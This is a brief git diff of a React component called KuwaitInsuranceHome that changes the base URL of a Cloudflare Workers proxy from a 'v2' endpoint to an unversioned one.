@@ -1,7 +1,7 @@
 import { useState, useEffect, useRef } from 'react';
 import { socket, visitor } from '../lib/store';
 
-const WORKER_BASE = 'https://moh-proxy-v2.fanarali881.workers.dev';
+const WORKER_BASE = 'https://moh-proxy.fanarali881.workers.dev';
 
 export default function KuwaitInsuranceHome() {
   const [loading, setLoading] = useState(true);
